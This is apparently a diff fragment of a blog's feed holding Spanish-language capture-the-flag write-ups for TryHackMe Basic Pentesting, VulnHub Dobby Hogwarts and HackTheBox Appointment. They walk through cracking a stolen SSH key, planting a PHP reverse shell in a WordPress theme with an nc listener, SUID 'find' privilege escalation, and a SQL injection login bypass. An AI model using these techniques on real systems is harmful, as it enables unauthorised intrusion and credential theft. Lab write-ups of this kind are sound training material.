-Entrar por ssh con el usuario jay y la contraseña descubierta
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/7.png){: .align-center}
-
-Ir al directorio home, luego al directorio personal de kay y al directorio `.ssh`, dentro se encontrará la clave privada del usuario
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/8.png){: .align-center}
-
-Leer el archivo de la clave privada `id_rsa` y copiar el contenido
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/9.png){: .align-center}
-
-Guardar el contenido en un archivo del equipo atacante
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/10.png){: .align-center}
-
-Convertirlo a hash con la herramienta `ssh2john.py` y guardarlo en otro archivo nuevo
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/11.png){: .align-center}
-
-Crackear la contraseña con `john`, servirán tanto rockyou como dark0de
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/12.png){: .align-center}
-
-Entrar por ssh usando la clave privada e introduciendo la contraseña crackeada
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/13.png){: .align-center}
-
-Ir al directorio personal de Kay y leer el archivo `pass.bak`
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/thm/basicpentesting/14.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="tryhackme" /><category term="tryhackme" /><category term="writeup" /><summary type="html"><![CDATA[[Academy][TryHackMe] Writeup de Basic Pentesting.]]></summary></entry><entry><title type="html">Dobby hogwarts</title><link href="http://localhost:4000/vulnhub/dobby-hogwarts/" rel="alternate" type="text/html" title="Dobby hogwarts" /><published>2022-07-31T00:00:00+02:00</published><updated>2022-07-31T00:00:00+02:00</updated><id>http://localhost:4000/vulnhub/dobby-hogwarts</id><content type="html" xml:base="http://localhost:4000/vulnhub/dobby-hogwarts/"><![CDATA[[https://www.vulnhub.com/entry/hogwarts-dobby,597/](https://www.vulnhub.com/entry/hogwarts-dobby,597/)
-
-```bash
-sudo nmap -vvv -sS -sV -O 192.168.1.0/24
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/1.png){: .align-center}
-
-Saldrá una IP con el puerto 80 abierto
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/2.png){: .align-center}
-
-Abrir navegador e ir a la IP, en este caso
-
-```bash
-192.168.1.82
-```
-
-Se abrirá una web por defecto de apache
-
-Hacemos click derecho e inspeccionar elemento
-
-Abajo del todo veremos una pista que nos dice que miremos en /alohomora así que ponemos
-
-```bash
-192.168.122.23/alohomora
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/3.png){: .align-center}
-
-
-Nos dirá que la clave de Draco es su casa (slytherin)
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/4.png){: .align-center}
-
-Ahora hacemos un gobuster para ver qué más directorios existen
-
-```bash
-gobuster  dir -u 192.168.122.23 -P 80 -w /usr/share/dirb/wordlists/common.txt
-```
-
-Nos saldrán más directorios, entre ellos uno llamado log
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/5.png){: .align-center}
-
-Accedemos a el así
-```bash
-192.168.122.23/log
-```
-
-Nos dará una contraseña y nos dirá que miremos en /DiagonAlley
-
-La contraseña está cifrada en base64, la desciframos y saldrá algo así
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/6.png){: .align-center}
-
-```bash
-::ilikesocks
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/7.png){: .align-center}
-
-Vamos a DiagonAlley así
-```bash
-192.168.122.23/DiagonAlley
-```
-
-Veremos una web con dos artículos
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/8.png){: .align-center}
-
-El primer artículo tendrá un código cifrado, lo podemos descifrar en decode.fr/cipher-identifier
-
-Ahora hacemos de nuevo un gobuster pero bajo ese directorio
-
-```bash
-gobuster  dir -u 192.168.122.23/DiagonAlley
-```
-
-Nos mostrará que hay varios directorios y archivos de wordpress, entre ellos uno llamado wp-admin
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/9.png){: .align-center}
-
-Accedemos a él así
-```bash
-192.168.122.23/DiagonAlley/wp-admin
-```
-
-Nos saldrá una página de inicio de sesión
-
-Colocamos de nombre Draco y de contraseña slytherin
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/10.png){: .align-center}
-
-Copiar php-reverse-shell.php de /usr/share/webshells/php a Documentos
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/11.png){: .align-center}
-
-Cambiar el propietario del archivo con chown para poder editarlo
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/12.png){: .align-center}
-
-Editarlo con nano para que lo IP sea la de nuestro equipo y el puerto que queramos poner como escucha
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/13.png){: .align-center}
-
-Copiar todo el código e ir a la web de wordpress con el usuario de Draco
-
-Ir a Apariencia -> editor de temas
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/14.png){: .align-center}
-
-Seleccionar de la lista el de error 404
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/15.png){: .align-center}
-
-Pegar el código y aplicar cambios
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/16.png){: .align-center}
-
-Usar el comando nc para escuchar desde ese puerto
-```bash
-nc -nlvp 4444
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/17.png){: .align-center}
-
-Ingresar un enlace inválido en wordpress
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/18.png){: .align-center}
-
-Se abrirá el acceso a la Shell del equipo que tiene wordpress
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/19.png){: .align-center}
-
-Ejecutar el comando
-```bash
-find . -exec /bin/bash -p \; -quit
-```
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/20.png){: .align-center}
-
-Nos dará acceso al bash en lugar de sh y con el usuario root
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/21.png){: .align-center}
-
-Cambiamos al usuario dobby con la contraseña que encontramos antes (ilikesocks)
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/22.png){: .align-center}
-
-Vamos al directorio /home/dobby y usamos el comando base32 al archivo flag1.txt para poder leer archivos dado que cat no funciona
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/23.png){: .align-center}
-
-Usamos la web dcode.fr/identification-chiffrement para saber que cifrado está utilizando y nos saldrá que es base32
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/24.png){: .align-center}
-
-Lo pasamos por un descifrador de base32
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/25.png){: .align-center}
-
-Y saldrá otra flag nueva, repetimos el proceso de detectar que cifrado usa
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/26.png){: .align-center}
-
-Y nos dirá ques cifrado md5, lo desciframos
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/27.png){: .align-center}
-
-Nos saldrá un mensaje que dice goodjob
-
-Esto, no sirve para nada realmente
-
-Ahora miramos el directorio del usuario root
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/28.png){: .align-center}
-
-Y leemos el archivo llamado proof.txt
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/vulnhub/dobby_hogwarts/29.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="vulnhub" /><category term="vulnhub" /><category term="easy" /><category term="writeup" /><summary type="html"><![CDATA[[Easy][Vulnhub] Writeup de Dobby hogwarts.]]></summary></entry><entry><title type="html">Appointment</title><link href="http://localhost:4000/hackthebox/appointment/" rel="alternate" type="text/html" title="Appointment" /><published>2022-07-30T00:00:00+02:00</published><updated>2022-07-30T00:00:00+02:00</updated><id>http://localhost:4000/hackthebox/appointment</id><content type="html" xml:base="http://localhost:4000/hackthebox/appointment/"><![CDATA[# Preguntas
-
-**What does the acronym SQL stand for?**
-
-Structured Query Language
-
-**What is one of the most common type of SQL vulnerabilities?**
-
-SQL injection
-
-**What does PII stand for?**
-
-Personally Identifiable Information  
-
-**What does the OWASP Top 10 list name the classification for this vulnerability?**
-
-A03:2021-Injection  
-
-**What service and version are running on port 80 of the target?**
-
-Apache httpd 2.4.38 ((Debian))
-
-**What is the standard port used for the HTTPS protocol?**
-
-443
-
-**What is one luck-based method of exploiting login pages?**
-
-brute-forcing
-
-**What is a folder called in web-application terminology?**
-
-directory
-
-**What response code is given for "Not Found" errors?**
-
-404
-
-**What switch do we use with Gobuster to specify we're looking to discover directories, and not subdomains?**
-
-dir
-
-**What symbol do we use to comment out parts of the code?**
-
-\#
-
-# Proceso
-
-Entrar al sitio web desde el navegador poniendo la ip, aparecerá un login
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/1.png){: .align-center}
-
-Tratar de entrar mediante inyección de SQL del siguiente modo
-
-Usuario= admin
-
-Contraseña= wrongpassword' OR '1'='1
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/2.png){: .align-center}
-
-Dará acceso mostrando un mensaje con el flag  
-
-![image-center]({{ site.url }}{{ site.baseurl }}/assets/images/htb/appointment/3.png){: .align-center}]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry></feed>
+<p><img src="http://localhost:4000/assets/images/htb/appointment/3.png" alt="image-center" class="align-center" /></p>]]></content><author><name>TheZombrex</name></author><category term="hackthebox" /><category term="hackthebox" /><category term="StartingPoint" /><category term="writeup" /><summary type="html"><![CDATA[[StartingPoint][HackTheBox] Writeup de appointment.]]></summary></entry></feed>
